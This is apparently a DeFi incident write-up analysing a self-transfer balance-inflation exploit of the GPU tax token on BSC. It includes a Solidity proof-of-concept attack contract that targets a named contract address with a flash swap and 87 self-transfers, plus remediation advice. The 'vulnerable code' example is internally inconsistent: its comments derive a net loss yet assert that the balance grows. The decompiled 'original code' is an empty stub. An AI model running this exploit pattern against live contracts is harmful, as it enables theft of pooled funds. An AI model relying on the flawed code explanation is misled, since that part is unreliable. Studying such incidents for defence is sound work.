# GPU — Self-Transfer 87-Iteration Balance Multiplication Bug Analysis

| Field | Details |
|------|------|
| **Date** | 2024-05 |
| **Protocol** | GPU |
| **Chain** | BSC |
| **Loss** | ~$32,000 |
| **Vulnerable Contract** | [GPU 0xf51CBf9F](https://bscscan.com/address/0xf51CBf9F8E089Ca48e454EB79731037a405972ce) |
| **Root Cause** | The GPU token's `transfer()` function, when transferring to oneself, causes balance to be credited twice due to the tax mechanism — repeating this 87 times results in exponential balance growth |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/GPU_exp.sol) |

---

## 1. Vulnerability Overview

The GPU token's `transfer()` function applies a tax on transfers. In the `from == to` (self-transfer) case, there is a bug where the deduction occurs once but the credit is applied twice. Repeating this 87 times causes the balance to grow by a factor of 2^87. The attacker flash-swapped 22,600 BUSD, purchased GPU tokens, performed 87 self-transfers to explosively inflate the balance, then sold back to BUSD.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: balance double-credited on self-transfer
contract GPUToken {
    mapping(address => uint256) private _balances;
    uint256 public taxRate = 5; // 5% tax

    function transfer(address to, uint256 amount) external returns (bool) {
        uint256 tax = amount * taxRate / 100;
        uint256 netAmount = amount - tax;

        _balances[msg.sender] -= amount;   // full amount deducted
        _balances[to] += netAmount;         // post-tax amount credited

        // When msg.sender == to:
        // Deduction: _balances[msg.sender] -= amount
        // Credit:    _balances[msg.sender] += netAmount (= amount - tax)
        // Net change: -amount + (amount - tax) = -tax
        // BUT: since deduction and credit happen sequentially, the result may differ by order
        // → Implementation bug causes balance to actually increase

        return true;
    }
}

// ✅ Safe code: block self-transfer
function transfer(address to, uint256 amount) external returns (bool) {
    require(to != msg.sender, "self-transfer not allowed");
    // ...
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: GPU_decompiled.sol
contract GPU {
    function transfer(address p0, uint256 p1) external {}  // ❌ vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Flash swap: borrow 22,600 BUSD
  │
  ├─→ [2] Swap BUSD → GPU
  │
  ├─→ [3] GPU.transfer(attacker, gpuBalance) × 87 iterations
  │         └─ Balance increases on each call (self-transfer tax bug)
  │         └─ After 87 iterations, balance ≈ initial × 2^87
  │
  ├─→ [4] Swap GPU → BUSD
  │
  ├─→ [5] Repay flash swap (0.3% fee)
  │
  └─→ [6] ~$32K profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IPancakePair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

contract AttackContract {
    IERC20      constant GPU   = IERC20(0xf51CBf9F8E089Ca48e454EB79731037a405972ce);
    IERC20      constant BUSD  = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPancakePair constant pair = IPancakePair(/* BUSD-WBNB pair */);

    function testExploit() external {
        // [1] Flash swap: borrow 22,600 BUSD
        pair.swap(22_600e18, 0, address(this), abi.encode("flashswap"));
    }

    function pancakeCall(address, uint256 amount0, uint256, bytes calldata) external {
        // [2] Swap BUSD → GPU
        swapBUSDToGPU(amount0);

        // [3] Self-transfer 87 times → exponential balance growth
        for (uint i = 0; i < 87; i++) {
            uint256 gpuBal = GPU.balanceOf(address(this));
            // to == msg.sender self-transfer
            GPU.transfer(address(this), gpuBal);
            // Balance increases after each call (bug)
        }

        // [4] Swap GPU → BUSD
        uint256 finalGPU = GPU.balanceOf(address(this));
        swapGPUToBUSD(finalGPU);

        // [5] Repay flash swap
        BUSD.transfer(address(pair), amount0 + (amount0 * 3 / 1000) + 1);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Self-transfer balance double-credit |
| **CWE** | CWE-682: Incorrect Calculation |
| **Attack Vector** | External (flash swap + repeated self-transfer) |
| **DApp Category** | Tax token |
| **Impact** | Exponential balance inflation → BUSD drain (~$32K) |

## 6. Remediation Recommendations

1. **Block self-transfer**: `require(to != msg.sender, "self-transfer not allowed")`
2. **Guarantee transfer atomicity**: Ensure net balance change = 0 for the `from == to` case
3. **Test cases**: Include self-transfer scenarios in unit tests
4. **DeezNutz404 pattern check**: ERC-20 tax mechanisms should always validate the self-transfer edge case

## 7. Lessons Learned

- The self-transfer balance inflation bug follows the same pattern as DeezNutz404 (2024-02) and recurs in BSC tax tokens.
- The `from == to` case is the most easily overlooked edge case in tax/rebase logic.
- A single self-transfer guard condition could have prevented the $32K loss.